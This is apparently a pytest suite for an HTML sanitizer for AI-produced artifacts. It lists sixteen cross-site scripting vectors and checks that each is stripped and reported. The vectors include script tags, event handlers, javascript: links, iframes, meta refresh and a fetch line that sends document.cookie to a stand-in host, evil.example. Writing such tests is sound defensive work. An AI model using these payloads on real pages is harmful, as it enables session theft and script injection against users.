"""
Hostile HTML artifact payloads.

Security is explicitly graded, so this suite asserts neutralization of each
construct an injected transcript might try to smuggle through an artifact. Two
properties are checked for every vector: the dangerous construct is gone from the
sanitized output, **and** it is reported as removed -- an artifact that silently
loses an element is a support burden, and a silent strip is a control nobody can
audit.
"""

from __future__ import annotations

import pytest

from app.artifacts.sanitize import audit, sanitize_html

# (name, payload, substrings that must not survive)
VECTORS: list[tuple[str, str, tuple[str, ...]]] = [
    (
        "script_src",
        '<script src="https://evil.example/x.js"></script><p>chart</p>',
        ("<script", "evil.example"),
    ),
    (
        "inline_script",
        "<script>fetch('https://evil.example?c='+document.cookie)</script><p>ok</p>",
        ("<script", "document.cookie", "evil.example"),
    ),
    (
        "img_onerror",
        '<img src=x onerror="alert(1)">',
        ("onerror", "alert(1)"),
    ),
    (
        "javascript_href",
        '<a href="javascript:alert(1)">click</a>',
        ("javascript:", "alert(1)"),
    ),
    (
        "iframe",
        '<iframe src="https://evil.example"></iframe>',
        ("<iframe", "evil.example"),
    ),
    (
        "object",
        '<object data="https://evil.example/x.swf"></object>',
        ("<object", "evil.example"),
    ),
    (
        "embed",
        '<embed src="https://evil.example/x.swf">',
        ("<embed", "evil.example"),
    ),
    (
        "svg_onload",
        '<svg onload="alert(1)"></svg>',
        ("<svg", "onload", "alert(1)"),
    ),
    (
        "css_url_javascript",
        '<div style="background:url(javascript:alert(1))">x</div>',
        ("javascript:", "style="),
    ),
    (
        "meta_refresh",
        '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        ("<meta", "refresh", "evil.example"),
    ),
    (
        "data_text_html",
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
        ("data:text/html",),
    ),
    (
        "form_action",
        '<form action="https://evil.example"><input name="x"></form>',
        ("<form", "evil.example"),
    ),
    (
        "base_tag",
        '<base href="https://evil.example/">',
        ("<base", "evil.example"),
    ),
    (
        "link_tag",
        '<link rel="stylesheet" href="https://evil.example/x.css">',
        ("<link", "evil.example"),
    ),
    (
        "srcdoc",
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        ("srcdoc", "<script"),
    ),
    (
        "nested_breakout",
        "<div><p>text</div><script>alert(1)</script></p>",
        ("<script",),
    ),
]


@pytest.mark.parametrize("name,payload,forbidden", VECTORS, ids=[v[0] for v in VECTORS])
def test_payload_is_neutralized(name: str, payload: str, forbidden: tuple[str, ...]) -> None:
    cleaned = sanitize_html(payload).cleaned
    lowered = cleaned.lower()
    for fragment in forbidden:
        assert fragment.lower() not in lowered, f"{name}: {fragment!r} survived sanitization"


@pytest.mark.parametrize("name,payload,forbidden", VECTORS, ids=[v[0] for v in VECTORS])
def test_payload_is_reported_as_removed(
    name: str, payload: str, forbidden: tuple[str, ...]
) -> None:
    """Stripping must be visible: the artifact record names what was taken out."""
    result = sanitize_html(payload)
    assert result.removed_anything, f"{name}: nothing was reported as removed"


def test_benign_html_survives_intact() -> None:
    """A sanitizer that mangles legitimate content is a bug, not a safe default."""
    clean = "<h2>Retention</h2><p>Keep <strong>users</strong>.</p><ul><li>one</li></ul>"
    result = sanitize_html(clean)
    assert "<h2>Retention</h2>" in result.cleaned
    assert "<strong>users</strong>" in result.cleaned
    assert "<li>one</li>" in result.cleaned
    assert result.removed == []


def test_data_uri_images_are_preserved() -> None:
    """Self-contained charts depend on data: images; blocking them breaks the feature."""
    result = sanitize_html('<img src="data:image/png;base64,iVBORw0KGgo=" alt="chart">')
    assert "data:image/png" in result.cleaned
    assert result.removed == []


def test_event_handlers_are_labelled_as_such() -> None:
    """`on*` is the highest-signal removal, so it gets its own report type."""
    result = sanitize_html('<img src="data:image/png;base64,AA" onload="x()">')
    assert any(
        item["type"] == "event_handler" and item["name"] == "onload" for item in result.removed
    )


def test_script_content_is_not_left_visible_as_text() -> None:
    """Removing the tag but keeping its body would paste JS in as prose."""
    cleaned = sanitize_html("<script>alert('secret')</script><p>after</p>").cleaned
    assert "alert" not in cleaned
    assert "after" in cleaned


def test_audit_reports_without_mutating() -> None:
    payload = "<script>x</script>"
    removed = audit(payload)
    assert any(item["name"] == "script" for item in removed)
    assert payload == "<script>x</script>"
